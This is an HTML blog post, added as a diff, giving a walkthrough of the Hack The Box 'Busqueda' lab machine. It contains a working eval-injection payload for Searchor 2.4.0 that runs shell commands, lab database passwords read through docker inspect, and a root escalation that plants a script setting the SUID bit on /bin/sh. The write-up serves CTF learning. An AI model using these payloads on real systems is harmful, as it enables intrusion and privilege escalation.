@@ -1,0 +1,305 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title> // CyberWinter</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="winteri3coming" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.3c3c186cd62e563ad6e2f00a89dbee656ab912d1d46f856b5605dd0232521e2a.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="Summary Today we&rsquo;re doing Busqueda from Hack The Box. It&rsquo;s supposed to be an easy machine but, for me i think it&rsquo;s much more of a medium one. The web server on this box is based on Flask (Python), and while these tend to be vulnerable to SSTI and code execution, it was a bit hard to craft the right payload, after getting a foothold on the box, User was straight forward, Root has many misleading routes, but with a good wide enumeration, you&rsquo;ll find your way in."/>
+
+    <meta property="og:title" content="" />
+<meta property="og:description" content="Summary Today we&rsquo;re doing Busqueda from Hack The Box. It&rsquo;s supposed to be an easy machine but, for me i think it&rsquo;s much more of a medium one. The web server on this box is based on Flask (Python), and while these tend to be vulnerable to SSTI and code execution, it was a bit hard to craft the right payload, after getting a foothold on the box, User was straight forward, Root has many misleading routes, but with a good wide enumeration, you&rsquo;ll find your way in." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://winteri3coming.github.io/posts/busqueda/" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://winteri3coming.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="winteri3coming" /></a>
+      <span class="app-header-title">CyberWinter</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/about/">About Me</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/contact/">Contact Me</a>
+      </nav>
+      <p>Welcome to CyberWinter!
+ @winteri3coming</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/winteri3coming" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/winteri3coming" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>My Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://facebook.com/winteri3coming" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-facebook">
+  <title>My Facebook</title>
+  <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title"></h1>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jan 1, 0001
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          8 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="summary">Summary</h2>
+<p>Today we&rsquo;re doing Busqueda from Hack The Box. It&rsquo;s supposed to be an easy machine but, for me i think it&rsquo;s much more of a medium one. The web server on this box is based on Flask (Python), and while these tend to be vulnerable to SSTI and code execution, it was a bit hard to craft the right payload, after getting a foothold on the box, User was straight forward, Root has many misleading routes, but with a good wide enumeration, you&rsquo;ll find your way in. Please do not refer to this Writeup unless you have tried enough, it took me 4 Days to pwn the box, after a plenty of research, that&rsquo;s how you learn! Not by reading writeups and applying the steps to get the flags!</p>
+<h2 id="recon--thought-process">Recon | Thought Process</h2>
+<p>As always, i start with an nmap scan</p>
+<blockquote>
+<p><code>nmap -sC -sV -oN nmap $IP;</code></p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.92 scan initiated Fri Apr 14 00:30:50 2023 as: nmap -sC -sV -v -oN nmap 10.10.11.208</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.208
+Host is up <span style="color:#f92672">(</span>0.34s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">256</span> 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.52
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.52 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Did not follow redirect to http://searcher.htb/
+Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Fri Apr 14 00:31:11 2023 -- 1 IP address (1 host up) scanned in 21.18 seconds</span>
+
+</code></pre></div><p>and we&rsquo;ve got two ports open, one of them being SSH on port 22 and its banner tells us it&rsquo;s an Ubuntu server, and a web server on port 80, we can see from the response that the hostname is <strong>searcher.htb</strong>, so we&rsquo;re going to add that to our hosts file:</p>
+<blockquote>
+<p><code>vim /etc/hosts</code></p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Host addresses</span>
+127.0.0.1  localhost
+127.0.1.1  parrot
+10.10.11.208    searcher.htb
+::1        localhost ip6-localhost ip6-loopback
+ff02::1    ip6-allnodes
+ff02::2    ip6-allrouters
+<span style="color:#75715e"># Others</span>
+</code></pre></div><p>Now after poking at the website, it seemed like it&rsquo;s a python based framework/library or something that creates search queries for you using a list of search engines (Google, Wikipedia,Amazon..etc). It&rsquo;s very important and a big part of my process is to understand how the web application work, and it seems to be pretty simple, you chose an engine, enter a search query and a there&rsquo;s a third optional parameter to chose wether to auto-redirect to the search engine website. If we don&rsquo;t select auto-redirect, we get a reflection of the result url. And when i saw that, i immediately thought of either SQLI, RCE or SSTI, python based web apps tend to be vulnerable to code execution.</p>
+<p>Next step is, i viewed the source code with Ctrl+U to see if anything stands out or if i can recongnize any vulnerable framework. And it happend that there was a reference to a package named <strong>Searchor 2.4.0</strong> along with its version and the github repo.
+<img src="../img1.png" alt="Alt text"></p>
+<p>Now first thing i do after enumerating a version of a specific framework is search for known CVES or vulnerabilites, for that just google <strong><code>Searchor 2.4.0 vulnerabilites</code></strong>, there&rsquo;s one entry in <strong>snyk.io</strong> database and it&rsquo;s Arbitary Code Execution but no Proof of Concept is found! This means we have to figure that ourselves and craft the right payload, for that we have to inspect the source code so we&rsquo;ll head to the github repo. After navigating arround i found an interresting commit about replacing the eval function in the cli method. If you don&rsquo;t know about eval then you should stop reading at this point, learn more about it and come back. It&rsquo;s basically a dangerous python function if not implemented correctly could lead to executing system commands. Here&rsquo;s a good article about it: <a href="https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html">https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html</a></p>
+<p><img src="../img2.png" alt="Alt text"></p>
+<p>After seeing how eval is implemented here, we notice that it takes the search query as one of its arguments. So i decided i&rsquo;m going to play with it in Burp, hopefully i&rsquo;ll be able to craft the right payload. After so many attempts and a lot of googling and pasting payload, i was finally able to find the right payload.</p>
+<p><img src="../img3.png" alt="Alt text"></p>
+<p>I didn&rsquo;t quite fully understand why did it have to be like that, the encoding was tricky:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#39;%2beval(compile(&#39;</span><span style="color:#66d9ef">for</span><span style="color:#f92672">+</span>x<span style="color:#f92672">+</span><span style="color:#f92672">in</span><span style="color:#f92672">+</span>range(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>a\n<span style="color:#f92672">+</span>import<span style="color:#f92672">+</span>os\n<span style="color:#f92672">+</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;id&#34;</span>)<span style="color:#e6db74">&#39;,&#39;</span>a<span style="color:#e6db74">&#39;,&#39;</span>single<span style="color:#e6db74">&#39;))%2b&#39;</span>
+</code></pre></div><p>But hey, it worked! Sometimes it&rsquo;s all about that, just spray and pray but, it&rsquo;s important to understand how it works.</p>
+<h2 id="user">User</h2>
+<p>We have code execution as <strong>svc</strong> right now, before we pop up a shell, we can grab the user flag:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#39;%2beval(compile(&#39;</span><span style="color:#66d9ef">for</span><span style="color:#f92672">+</span>x<span style="color:#f92672">+</span><span style="color:#f92672">in</span><span style="color:#f92672">+</span>range(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>a\n<span style="color:#f92672">+</span>import<span style="color:#f92672">+</span>os\n<span style="color:#f92672">+</span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;cat ~/user.txt&#34;</span>)<span style="color:#e6db74">&#39;,&#39;</span>a<span style="color:#e6db74">&#39;,&#39;</span>single<span style="color:#e6db74">&#39;))%2b&#39;</span>
+</code></pre></div><p><img src="../img4.png" alt="Alt text"></p>
+<p>There are many ways to get a shell but i like to make an ssh key, i&rsquo;m going to skip this because it&rsquo;s easy. Just make a pair of keys with:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh-keygen
+</code></pre></div><p>copy id_rsa.pub to authorized_keys on the box, don&rsquo;t forget to change permissions on the private key:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod <span style="color:#ae81ff">600</span> id_rsa
+</code></pre></div><p>We should be good to go:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -i id_rsa svc@searcher.htb
+</code></pre></div><p><img src="../img5.png" alt="Alt text"></p>
+<h2 id="root">Root</h2>
+<p>I spent a lot of time digging arround without finding anything, just looking for some credentials to execute some useful commands such as <strong>sudo -l</strong>, luckily, it took me longer than it should, i found a .git folder in the webserver directory, first thing you do when you find a git directory, is to view the config file, and then view the commits and the logs. In this case, the config file had the credentials i was looking for:</p>
+<p><img src="../img6.png" alt="Alt text"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">svc@busqueda:~$ sudo -l 
+Matching Defaults entries <span style="color:#66d9ef">for</span> svc on busqueda:
+    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, use_pty
+
+User svc may run the following commands on busqueda:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> /usr/bin/python3 /opt/scripts/system-checkup.py *
+</code></pre></div><p>We can run a python script called <strong>system-checkup.py</strong> as root, after viewing the help, the script seemed to do two out of three things i understood, it can list available docker containers with <strong>docker-ps</strong> argument, secondly, it can inspect the container with <strong>docker-inspect</strong>, there&rsquo;s a third option that i didn&rsquo;t understand at first; <strong>full-checkup</strong>. But by now, i&rsquo;m sure this script would be our privelage escalation vector.</p>
+<p>Now let&rsquo;s go ahead and inspect the docker containers on this box, first we list them:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS          PORTS                                             NAMES
+960873171e2e   gitea/gitea:latest   <span style="color:#e6db74">&#34;/usr/bin/entrypoint…&#34;</span>   <span style="color:#ae81ff">3</span> months ago   Up <span style="color:#ae81ff">39</span> minutes   127.0.0.1:3000-&gt;3000/tcp, 127.0.0.1:222-&gt;22/tcp   gitea
+f84a6b33fb5a   mysql:8              <span style="color:#e6db74">&#34;docker-entrypoint.s…&#34;</span>   <span style="color:#ae81ff">3</span> months ago   Up <span style="color:#ae81ff">39</span> minutes   127.0.0.1:3306-&gt;3306/tcp, 33060/tcp               mysql_db
+
+</code></pre></div><p><strong>mysql_db</strong> seems quite the one, next we inspect the database, the syntax for the command is same as docker, if you&rsquo;re not familiar with docker, the commands will look weird to you. In that case, refer to docker docs.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect format<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;{{json .Config}}&#39;</span> mysql_db                                
+format<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;Hostname&#34;</span>:<span style="color:#e6db74">&#34;f84a6b33fb5a&#34;</span>,<span style="color:#e6db74">&#34;Domainname&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;User&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;AttachStdin&#34;</span>:false,<span style="color:#e6db74">&#34;AttachStdout&#34;</span>:false,<span style="color:#e6db74">&#34;AttachStderr&#34;</span>:false,<span style="color:#e6db74">&#34;ExposedPorts&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;3306/tcp&#34;</span>:<span style="color:#f92672">{</span>
+<span style="color:#f92672">}</span>,<span style="color:#e6db74">&#34;33060/tcp&#34;</span>:<span style="color:#f92672">{}}</span>,<span style="color:#e6db74">&#34;Tty&#34;</span>:false,<span style="color:#e6db74">&#34;OpenStdin&#34;</span>:false,<span style="color:#e6db74">&#34;StdinOnce&#34;</span>:false,<span style="color:#e6db74">&#34;Env&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF&#34;</span>,<span style="color:#e6db74">&#34;MYSQL_USER=gitea&#34;</span>,<span style="color:#e6db74">&#34;MYSQL_PASSWORD=
+</span><span style="color:#e6db74">yuiu1hoiu4i5ho1uh&#34;</span>,<span style="color:#e6db74">&#34;MYSQL_DATABASE=gitea&#34;</span>,<span style="color:#e6db74">&#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span>,<span style="color:#e6db74">&#34;GOSU_VERSION=1.14&#34;</span>,<span style="color:#e6db74">&#34;MYSQL_MAJOR=8.0&#34;</span>,<span style="color:#e6db74">&#34;M
+</span><span style="color:#e6db74">YSQL_VERSION=8.0.31-1.el8&#34;</span>,<span style="color:#e6db74">&#34;MYSQL_SHELL_VERSION=8.0.31-1.el8&#34;</span><span style="color:#f92672">]</span>,<span style="color:#e6db74">&#34;Cmd&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;mysqld&#34;</span><span style="color:#f92672">]</span>,<span style="color:#e6db74">&#34;Image&#34;</span>:<span style="color:#e6db74">&#34;mysql:8&#34;</span>,<span style="color:#e6db74">&#34;Volumes&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;/var/lib/mysql&#34;</span>:<span style="color:#f92672">{}}</span>,<span style="color:#e6db74">&#34;WorkingDir&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;Ent
+</span><span style="color:#e6db74">rypoint&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;docker-entrypoint.sh&#34;</span><span style="color:#f92672">]</span>,<span style="color:#e6db74">&#34;OnBuild&#34;</span>:null,<span style="color:#e6db74">&#34;Labels&#34;</span>:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;com.docker.compose.config-hash&#34;</span>:<span style="color:#e6db74">&#34;1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538
+</span><span style="color:#e6db74">c54792b&#34;</span>,<span style="color:#e6db74">&#34;com.docker.compose.container-number&#34;</span>:<span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#e6db74">&#34;com.docker.compose.oneoff&#34;</span>:<span style="color:#e6db74">&#34;False&#34;</span>,<span style="color:#e6db74">&#34;com.docker.compose.project&#34;</span>:<span style="color:#e6db74">&#34;docker&#34;</span>,<span style="color:#e6db74">&#34;com.docker.compose.proje
+</span><span style="color:#e6db74">ct.config_files&#34;</span>:<span style="color:#e6db74">&#34;docker-compose.yml&#34;</span>,<span style="color:#e6db74">&#34;com.docker.compose.project.working_dir&#34;</span>:<span style="color:#e6db74">&#34;/root/scripts/docker&#34;</span>,<span style="color:#e6db74">&#34;com.docker.compose.service&#34;</span>:<span style="color:#e6db74">&#34;db&#34;</span>,<span style="color:#e6db74">&#34;com.docker.co
+</span><span style="color:#e6db74">mpose.version&#34;</span>:<span style="color:#e6db74">&#34;1.29.2&#34;</span><span style="color:#f92672">}}</span>
+</code></pre></div><p>We now have some mysql passwords, but what also got my attention is <strong>MYSQL_USER=gitea</strong>, when i see gitea there&rsquo;s a big chance a git instance is running on localhost, by now i just slapped my face thinking why did i forget to check for these, i usually bruteforce for virtual hosts as part of my recon process, and also check for local ports and what&rsquo;s running on them. In this case i immediately went ahead and checked <strong>apache&rsquo;s sites-enabled</strong>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">svc@busqueda:~$ cat /etc/apache2/sites-enabled/000-default.conf 
+&lt;VirtualHost *:80&gt;
+        ProxyPreserveHost On
+        ServerName searcher.htb
+        ServerAdmin admin@searcher.htb
+        ProxyPass / http://127.0.0.1:5000/
+        ProxyPassReverse / http://127.0.0.1:5000/
+
+        RewriteEngine On
+        RewriteCond %<span style="color:#f92672">{</span>HTTP_HOST<span style="color:#f92672">}</span> !^searcher.htb$
+        RewriteRule /.* http://searcher.htb/ <span style="color:#f92672">[</span>R<span style="color:#f92672">]</span>
+
+        ErrorLog <span style="color:#e6db74">${</span>APACHE_LOG_DIR<span style="color:#e6db74">}</span>/error.log
+        CustomLog <span style="color:#e6db74">${</span>APACHE_LOG_DIR<span style="color:#e6db74">}</span>/access.log combined
+
+&lt;/VirtualHost&gt;
+
+&lt;VirtualHost *:80&gt;
+        ProxyPreserveHost On
+        ServerName gitea.searcher.htb
+        ServerAdmin admin@searcher.htb
+        ProxyPass / http://127.0.0.1:3000/
+        ProxyPassReverse / http://127.0.0.1:3000/
+
+        ErrorLog <span style="color:#e6db74">${</span>APACHE_LOG_DIR<span style="color:#e6db74">}</span>/error.log
+        CustomLog <span style="color:#e6db74">${</span>APACHE_LOG_DIR<span style="color:#e6db74">}</span>/access.log combined
+
+&lt;/VirtualHost&gt;
+
+<span style="color:#75715e"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span>
+</code></pre></div><p>As we can see, there&rsquo;s a web server (git instance) running locally on port 3000, now let&rsquo;s ssh tunnel is to our machine and we&rsquo;ll be able to view the web server:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -L 3000:127.0.0.1:3000 svc@searcher.htb
+</code></pre></div><p>Now we have the instance running on our localhost on port 3000:
+<img src="../img7.png" alt="Alt text"></p>
+<p>From here we go sign in, we can sign in with the coby credentials we got from the git config file but we won&rsquo;t find anything there, we will use the administrator with the passwords we got from <strong>mysql_db</strong>, when we&rsquo;re in we&rsquo;ll find a python script named <strong>full-checkup.py</strong> in the scripts repository:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/bin/bash</span>
+<span style="color:#f92672">import</span> subprocess
+<span style="color:#f92672">import</span> sys
+
+actions <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;full-checkup&#39;</span>, <span style="color:#e6db74">&#39;docker-ps&#39;</span>,<span style="color:#e6db74">&#39;docker-inspect&#39;</span>]
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run_command</span>(arg_list):
+    r <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run(arg_list, capture_output<span style="color:#f92672">=</span>True)
+    <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>stderr:
+        output <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>stderr<span style="color:#f92672">.</span>decode()
+    <span style="color:#66d9ef">else</span>:
+        output <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>decode()
+
+    <span style="color:#66d9ef">return</span> output
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">process_action</span>(action):
+    <span style="color:#66d9ef">if</span> action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;docker-inspect&#39;</span>:
+        <span style="color:#66d9ef">try</span>:
+            _format <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]
+            <span style="color:#66d9ef">if</span> len(_format) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+                <span style="color:#66d9ef">print</span>(f<span style="color:#e6db74">&#34;Format can&#39;t be empty&#34;</span>)
+                exit(<span style="color:#ae81ff">1</span>)
+            container <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">3</span>]
+            arg_list <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;docker&#39;</span>, <span style="color:#e6db74">&#39;inspect&#39;</span>, <span style="color:#e6db74">&#39;--format&#39;</span>, _format, container]
+            <span style="color:#66d9ef">print</span>(run_command(arg_list)) 
+        
+        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">IndexError</span>:
+            <span style="color:#66d9ef">print</span>(f<span style="color:#e6db74">&#34;Usage: {sys.argv[0]} docker-inspect &lt;format&gt; &lt;container_name&gt;&#34;</span>)
+            exit(<span style="color:#ae81ff">1</span>)
+    
+        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Something went wrong&#39;</span>)
+            exit(<span style="color:#ae81ff">1</span>)
+    
+    <span style="color:#66d9ef">elif</span> action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;docker-ps&#39;</span>:
+        <span style="color:#66d9ef">try</span>:
+            arg_list <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;docker&#39;</span>, <span style="color:#e6db74">&#39;ps&#39;</span>]
+            <span style="color:#66d9ef">print</span>(run_command(arg_list)) 
+        
+        <span style="color:#66d9ef">except</span>:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Something went wrong&#39;</span>)
+            exit(<span style="color:#ae81ff">1</span>)
+
+    <span style="color:#66d9ef">elif</span> action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;full-checkup&#39;</span>:
+        <span style="color:#66d9ef">try</span>:
+            arg_list <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;./full-checkup.sh&#39;</span>]
+            <span style="color:#66d9ef">print</span>(run_command(arg_list))
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;[+] Done!&#39;</span>)
+        <span style="color:#66d9ef">except</span>:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Something went wrong&#39;</span>)
+            exit(<span style="color:#ae81ff">1</span>)
+            
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+
+    <span style="color:#66d9ef">try</span>:
+        action <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
+        <span style="color:#66d9ef">if</span> action <span style="color:#f92672">in</span> actions:
+            process_action(action)
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">IndexError</span>
+
+    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">IndexError</span>:
+        <span style="color:#66d9ef">print</span>(f<span style="color:#e6db74">&#39;Usage: {sys.argv[0]} &lt;action&gt; (arg1) (arg2)&#39;</span>)
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&#39;</span>)
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;     docker-ps     : List running docker containers&#39;</span>)
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;     docker-inspect : Inpect a certain docker container&#39;</span>)
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;     full-checkup  : Run a full system checkup&#39;</span>)
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&#39;</span>)
+        exit(<span style="color:#ae81ff">1</span>)
+</code></pre></div><p>This is 100% the script we found on the box, after reading and trying to understand how it works, i managed to spot the jackpot, the <strong>full-checkup</strong> argument checks if there&rsquo;s a <strong>full-checkup.sh</strong> script in the current directory and simply executes it, so our attack flow would be as follow, and by now there are many ways to get root, you can get the flag without need to get a root shell, but for elaboration purposes, i will create the file and make it add as <strong>suid bit</strong> on <strong>/bin/sh</strong> so when we run it as sudo we&rsquo;ll get a root bash shell.</p>
+<p>This is the file i created, a simple exploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">svc@busqueda:~$ cat full-checkup.sh 
+<span style="color:#75715e">#!/bin/bash</span>
+chmod +s /bin/sh
+svc@busqueda:~$ chmod +x full-checkup.sh
+</code></pre></div><p>Now we run the command:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Done!
+svc@busqueda:~$
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">svc@busqueda:~$ /bin/sh -p
+<span style="color:#75715e"># id</span>
